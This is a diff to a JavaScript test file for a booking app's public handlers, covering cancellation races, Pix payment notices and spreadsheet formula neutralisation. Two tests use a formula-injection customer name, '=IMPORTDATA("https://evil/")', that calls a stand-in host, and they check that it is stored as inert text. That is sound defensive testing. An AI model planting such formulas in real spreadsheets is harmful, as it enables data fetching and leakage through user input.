@@ -123,7 +123,8 @@ describe('public handlers', () => {
       data: MON, horaInicio: '13:00', servicoId: 'S1', clienteNome: '=IMPORTDATA("https://evil/")', clienteWhatsApp: '11955554444', metodoPagamento: 'NO_LOCAL',
     });
     const rows = fake.db[SID].Agendamentos;
-    expect(rows[rows.length - 1][4]).toBe("'=IMPORTDATA(\"https://evil/\")");
+    expect(rows[rows.length - 1][4]).toBe('=IMPORTDATA("https://evil/")');
+    expect(fake.isLive(SID, 'Agendamentos', rows.length - 1, 4)).toBe(false);
     expect(r.success).toBe(true);
   });
 
@@ -155,9 +156,91 @@ describe('public handlers', () => {
     expect(fake.db[SID].Agendamentos[1][11]).toBe('CANCELADO');
   });
 
-  it('notifyPixPaidByCustomer marks the booking', async () => {
-    expect(await h.notifyPixPaidByCustomer(ctx, 'AG-3')).toEqual({ success: true });
-    expect(fake.db[SID].Agendamentos[3][10]).toBe('CLIENTE_INFORMOU_PIX');
+  const clears = () => fake.calls.filter((c) => c.path.endsWith(':clear'));
+  const puts = () => fake.calls.filter((c) => c.method === 'PUT');
+  // Simula outra reserva gravada entre a leitura da agenda e a gravação da mudança.
+  function appendDuringRead(row) {
+    const real = ctx.g.readTab;
+    let done = false;
+    ctx.g = { ...ctx.g, async readTab(sid, tab) {
+      const out = await real(sid, tab);
+      if (tab === 'Agendamentos' && !done) { done = true; fake.db[SID].Agendamentos.push(row); }
+      return out;
+    } };
+  }
+  const EVA = ['AG-9', MON, '14:00', '15:00', 'Eva', '5511900000000', 'S1', 'Gel', '100', 'NO_LOCAL', 'PAGAR_NO_STUDIO', 'RESERVADO', 'e9', ''];
+
+  it('cancelCustomerBooking changes only that row: a booking saved meanwhile survives, the tab is never cleared', async () => {
+    appendDuringRead(EVA);
+    await h.cancelCustomerBooking(ctx, 'AG-1', '11997778888');
+    expect(clears()).toHaveLength(0);
+    const rows = fake.db[SID].Agendamentos;
+    expect(rows[1][11]).toBe('CANCELADO');
+    expect(rows[1][12]).toBe('DELETED_ev1');
+    expect(rows.find((r) => r[0] === 'AG-9')).toEqual(EVA);
+    expect(rows).toHaveLength(5);
+  });
+
+  it('cancelCustomerBooking refuses when the row moved before writing', async () => {
+    const real = ctx.g.readTab;
+    ctx.g = { ...ctx.g, async readTab(sid, tab) {
+      const out = await real(sid, tab);
+      if (tab === 'Agendamentos') fake.db[SID].Agendamentos.splice(1, 1); // alguém apagou a linha AG-1 na planilha
+      return out;
+    } };
+    await expect(h.cancelCustomerBooking(ctx, 'AG-3', '11997778888')).rejects.toThrow(UserError);
+    expect(puts()).toHaveLength(0);
+    expect(fake.db[SID].Agendamentos.map((r) => r[11])).toEqual(['StatusReserva', 'CANCELADO', 'RESERVADO']);
+  });
+
+  it('formula name stays neutralised after booking and then cancelling (round trip)', async () => {
+    const r = await h.createCustomerBooking(ctx, {
+      data: MON, horaInicio: '13:00', servicoId: 'S1', clienteNome: '=IMPORTDATA("https://evil/")', clienteWhatsApp: '11955554444', metodoPagamento: 'PIX_TOTAL',
+    });
+    await h.notifyPixPaidByCustomer(ctx, r.reserva.id, '11955554444');
+    await h.cancelCustomerBooking(ctx, r.reserva.id, '11955554444');
+    const rows = fake.db[SID].Agendamentos;
+    const i = rows.findIndex((x) => x[0] === r.reserva.id);
+    expect(rows[i][11]).toBe('CANCELADO');
+    expect(rows[i][4]).toBe('=IMPORTDATA("https://evil/")');
+    expect(fake.isLive(SID, 'Agendamentos', i, 4)).toBe(false);
+  });
+
+  it('notifyPixPaidByCustomer marks only that booking, with the matching phone', async () => {
+    appendDuringRead(EVA);
+    expect(await h.notifyPixPaidByCustomer(ctx, 'AG-3', '(11) 99777-8888')).toEqual({ success: true });
+    const rows = fake.db[SID].Agendamentos;
+    expect(rows[3][10]).toBe('CLIENTE_INFORMOU_PIX');
+    expect(rows.find((r) => r[0] === 'AG-9')).toEqual(EVA);
+    expect(clears()).toHaveLength(0);
+  });
+
+  it('notifyPixPaidByCustomer requires the booking phone and a known id', async () => {
+    await expect(h.notifyPixPaidByCustomer(ctx, 'AG-3')).rejects.toThrow(UserError);
+    await expect(h.notifyPixPaidByCustomer(ctx, 'AG-3', '11 90000-1111')).rejects.toThrow('Reserva não localizada.');
+    await expect(h.notifyPixPaidByCustomer(ctx, 'AG-404', '11997778888')).rejects.toThrow('Reserva não localizada.');
+    expect(fake.db[SID].Agendamentos[3][10]).toBe('AGUARDANDO_VALIDACAO_PIX');
+    expect(puts()).toHaveLength(0);
+  });
+
+  it('notifyPixPaidByCustomer skips cancelled and already confirmed bookings, and repeats write nothing', async () => {
+    await expect(h.notifyPixPaidByCustomer(ctx, 'AG-2', '11911112222')).rejects.toThrow(UserError); // CANCELADO
+    expect(fake.db[SID].Agendamentos[2][10]).toBe('AGUARDANDO_VALIDACAO_PIX');
+    fake.db[SID].Agendamentos[3][10] = 'PIX_CONFIRMADO';
+    expect(await h.notifyPixPaidByCustomer(ctx, 'AG-3', '11997778888')).toEqual({ success: true });
+    expect(fake.db[SID].Agendamentos[3][10]).toBe('PIX_CONFIRMADO');
+    expect(puts()).toHaveLength(0);
+    fake.db[SID].Agendamentos[3][10] = 'AGUARDANDO_VALIDACAO_PIX';
+    await h.notifyPixPaidByCustomer(ctx, 'AG-3', '11997778888');
+    await h.notifyPixPaidByCustomer(ctx, 'AG-3', '11997778888');
+    expect(puts()).toHaveLength(1);
+  });
+
+  it('createCustomerBooking returns the stored WhatsApp so the page can notify the Pix', async () => {
+    const r = await h.createCustomerBooking(ctx, {
+      data: MON, horaInicio: '13:00', servicoId: 'S1', clienteNome: 'Dani', clienteWhatsApp: '(11) 95555-4444', metodoPagamento: 'PIX_TOTAL',
+    });
+    expect(r.reserva.clienteWhatsApp).toBe('5511955554444');
   });
 });
 
